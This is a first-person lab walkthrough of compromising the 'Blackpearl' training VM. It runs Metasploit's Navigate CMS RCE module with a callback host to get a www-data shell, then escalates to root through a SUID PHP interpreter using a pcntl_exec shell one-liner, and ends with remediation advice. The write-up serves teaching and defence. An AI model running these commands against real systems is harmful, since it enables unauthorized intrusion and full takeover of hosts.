Overview

  • Target: Blackpearl
  • OS: Linux, x86_64
  • Service: Nginx 1.14.2 serving Navigate CMS 2.8
  • Attack: Navigate CMS remote code execution to www-data, then a root-owned SUID PHP interpreter to root
  • Scope: Intentionally vulnerable, isolated training VM

I found Navigate CMS 2.8 behind a virtual host, exploited it for a www-data shell and escalated to root through a SUID PHP interpreter.

Reconnaissance

Placeholders such as <TARGET_IP> stand in for lab addresses. The IP served the default nginx welcome page. Its source ended with a comment that named the domain:

<!-- Webmaster: alek@blackpearl.tcm -->

I ran FFUF against the IP with the medium DirBuster wordlist:

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ \
  -u http://<TARGET_IP>/FUZZ

Many responses were the same 652-byte page, so I filtered that baseline with -fs 652. That left /secret.

/secret was a note from Alek: directory busting would not give anything on this site, so search somewhere else. I turned to the domain from the comment and enumerated it with DNSRecon:

dnsrecon -d blackpearl.tcm

I added the hostname to /etc/hosts on Kali and my Mac and checked it with getent:

sudo nano /etc/hosts
# added:
<TARGET_IP> blackpearl.tcm

getent hosts blackpearl.tcm
<TARGET_IP> blackpearl.tcm

I checked HTTP connectivity with curl:

curl -I http://blackpearl.tcm
HTTP/1.1 200 OK
Server: nginx/1.14.2
Content-Type: text/html; charset=UTF-8

Enumerating the virtual host found /navigate, running Navigate CMS 2.8. That became my target.

Initial access

Navigate CMS 2.8 has a Metasploit module that chains an authentication bypass with path traversal in the upload handler to place and run PHP code. I set the target, virtual host and callback:

msfconsole
search navigate_cms
use exploit/multi/http/navigate_cms_rce
show options
set LHOST <CALLBACK_IP>
set RHOST <TARGET_IP>
set VHOST blackpearl.tcm
set TARGETURI /navigate/
exploit

The exploit gave me a shell, and whoami confirmed www-data: command execution as the web service account.

The shell was limited, so I spawned interactive Bash with Python’s pty module:

python -c 'import pty; pty.spawn("/bin/bash")'

Privilege escalation

I checked my identity, groups, sudo rights and shell history. None gave an escalation path.

whoami
id
sudo -l
history

I served LinPEAS, a Linux privilege escalation enumeration script, from Kali on port 80:

python3 -m http.server 80

I downloaded it to /tmp on Blackpearl, made it executable and ran it:

chmod +x linpeas.sh
./linpeas.sh

I reviewed the output for SUID/SGID executables, writable paths, privileged processes, scheduled tasks and configuration weaknesses. It flagged PHP 7.3 as an escalation vector.

I enumerated SUID (set user ID) binaries, which run with their owner’s privileges, and inspected /usr/bin/php7.3:

find / -type f -perm -4000 2>/dev/null
ls -l /usr/bin/php7.3

The PHP interpreter was owned by root and SUID. GTFOBins shows how pcntl_exec() launches a shell that keeps those privileges. I ran:

/usr/bin/php7.3 -r 'pcntl_exec("/bin/sh", ["-p"]);'

This was a permissions problem, not a PHP vulnerability: a general-purpose interpreter had root privileges. pcntl_exec() replaced the PHP process with /bin/sh, and -p kept the effective privileges inherited from the SUID interpreter. whoami confirmed root:

www-data@blackpearl:/tmp$ /usr/bin/php7.3 -r 'pcntl_exec("/bin/sh", ["-p"]);'
# whoami
root

The real UID stayed www-data while the effective UID was root, as expected from a SUID binary.

Result

Result: Root access achieved

I went from Navigate CMS 2.8 to a www-data shell, then to root through a root-owned SUID PHP interpreter.

Attack path

  1. Page-source comment names blackpearl.tcm
  2. DNS enumeration and virtual host
  3. /navigate: Navigate CMS 2.8
  4. Navigate CMS code execution
  5. www-data
  6. Local enumeration
  7. SUID PHP
  8. Root

Remediation

Finding

Navigate CMS remote code execution

I exploited the CMS to run commands as www-data, which exposed everything that account could reach and gave me a foothold.

Fix

Upgrade to a supported, fixed CMS release or replace it, then verify the authentication and upload handlers no longer permit the chain. Restrict unnecessary functionality and service-account permissions.

Finding

SUID PHP privilege escalation

I used the privileged PHP interpreter to escalate from www-data to a root shell.

Fix

Remove unnecessary SUID permissions from interpreter binaries, audit privileged executable ownership and permissions, and enforce least privilege.

Key takeaways

  • Page source is recon: one webmaster comment named the virtual host that hid the CMS, after FFUF on the bare IP found only a decoy.
  • An outdated CMS became a shell with one Metasploit module; exposed apps need patching or replacing.
  • A root-owned SUID interpreter gives root to anyone who can run it. find / -perm -4000 belongs in every Linux review.
